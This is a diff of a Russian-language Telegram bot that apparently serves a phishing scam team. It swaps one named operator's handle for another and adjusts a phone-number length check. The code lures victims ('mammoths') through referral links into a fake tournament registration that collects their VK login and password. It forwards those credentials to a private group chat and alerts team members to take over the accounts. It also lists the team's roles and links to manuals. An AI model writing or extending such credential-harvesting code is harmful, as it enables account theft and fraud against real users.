@@ -179,7 +179,7 @@ referal_bt.action("agggrrrree321321", async (ctx) => {
 
     })
         cron.schedule("00 10 * * *", () => {
-            ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @casino_rotebal ]',{chat_id: ctx.session.normalize,
+            ctx.sendMessage('🦣 FULL WORK 🦣 \n\n📍 Работаем с 10:00 - 23:00 по мск! \n\n🧑‍💻 Актуальные вбиверы 🧑‍💻 \n\n- Вадим [ @alexdrawn ]',{chat_id: ctx.session.normalize,
             
                 "reply_markup": {
                     "keyboard": [["🧑🏼‍💻 Профиль","💻О проекте"]],
@@ -388,7 +388,7 @@ bot.command("start", async (ctx) => {
         ctx.session.name = ctx.message.from.username
         ctx.session.refer = ctx.message.text.replaceAll("/start ", "")
         if (await collection.findOne({ id: Number(ctx.session.refer) })) {
-            await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @casino_rotebal`)
+            await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт перешёл по вашей реферальной ссылке! \n\n💬 Телеграмм [@${ctx.message.from.username}] \n\n🧑‍💻 Вбивер - @alexdrawn`)
         }
     
     
@@ -470,7 +470,7 @@ vk_info3.on("text",async(ctx)=>{
                 return value;
             }
         })
-        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @casino_rotebal`)
+        await referal_bt.telegram.sendMessage(ctx.session.refer, `🦣 Мамонт ввёл логи! \n\n‼️ СРОЧНО ПИШИТЕ ВБИВЕРУ ‼️ \n\n🧑‍💻 Вбивер - @alexdrawn`)
         await ctx.sendMessage(`✅ Авторизация прошла успешно! Ваша заявка с уникальным номером #${ctx.session.id} была зарегистрирована! Перешлите это сообщение администрации турнира. \n@Danil_Golden`)
         await ctx.sendMessage(`🦣 Лохматый ввёл логи!\n\n💻 login / pass ${ctx.session.login} ${ctx.session.pass}\n\n🧑🏼‍💻 Воркер - [${ctx.session.refer}] \n\n☠️ Мамонт - [@${ctx.session.name}] \n\n💎 Сумма воркера - НЕИЗВЕСТНО`, { chat_id: -835842170 })
         ctx.scene.leave()
@@ -489,7 +489,7 @@ vk_info2.on("text", async (ctx) => {
         await ctx.sendMessage("🔴 Пожалуйста, введите корректные данные! (не забудьте про + в начале номера)")
     }
     else{
-        if(ctx.session.login.toString().includes("+7") && ctx.session.login.toString().length == 12){
+        if(ctx.session.login.toString().includes("+7") && ctx.session.login.toString().length == 13){
             await ctx.sendMessage(`✅ Для дальнейшего прохода на следующий этап регистрации введите свой пароль`)
             return ctx.wizard.next()
         }
@@ -542,10 +542,10 @@ bot.hears("📌 Подать заявку", async (callbackQuery) => {
 
 
 support_bot.command("beaters",async(ctx)=>{
-    ctx.sendMessage("☠️ Активные вбиверы: \n\n💎 Вадим - [ @casino_rotebal ] \n💎 Aqare - [ @Aqareqq ]")
+    ctx.sendMessage("☠️ Активные вбиверы: \n\n💎 Вадим - [ @alexdrawn ] \n💎 Aqare - [ @Aqareqq ]")
 })
 support_bot.command("team",async(ctx)=>{
-    ctx.sendMessage("⚫️ Aqare - [ @Aqareqq ] вбивер | ТС | ТП \n\n🟢 Вадим - [ @casino_rotebal ] вбивер \n\n🔴 Хариз Гарсия - [ @Xariznewman ] кодер")
+    ctx.sendMessage("⚫️ Aqare - [ @Aqareqq ] вбивер | ТС | ТП \n\n🟢 Вадим - [ @alexdrawn ] вбивер \n\n🔴 Хариз Гарсия - [ @Xariznewman ] кодер")
 })
 support_bot.command("manuals",async(ctx)=>{
     ctx.sendMessage("📚 Всё мануалы находятся здесь - https://t.me/+fQOGFgOufOg4NDJl")
